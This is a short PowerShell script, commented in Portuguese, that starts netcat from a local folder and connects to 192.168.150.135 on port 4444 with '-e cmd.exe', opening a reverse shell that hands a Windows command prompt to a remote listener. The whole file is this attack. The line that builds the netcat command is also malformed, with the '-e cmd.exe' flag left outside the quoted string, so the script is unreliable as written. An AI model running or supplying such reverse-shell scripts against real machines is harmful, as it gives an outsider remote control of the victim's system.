# Defina o caminho completo para a pasta onde o netcat está localizado
$netcatPath = "C:\Users\dougl\netcat-1.11"

# Defina o IP e a porta que deseja usar
$ip = "192.168.150.135"
$port = 4444

# Comando para executar o netcat
$ncCommand = ".\nc.exe $ip $port" -e cmd.exe

# Abre uma nova instância do PowerShell, navega para o diretório e executa o comando
Start-Process powershell -ArgumentList "-NoExit", "-Command", "cd `"$netcatPath`"; $ncCommand"
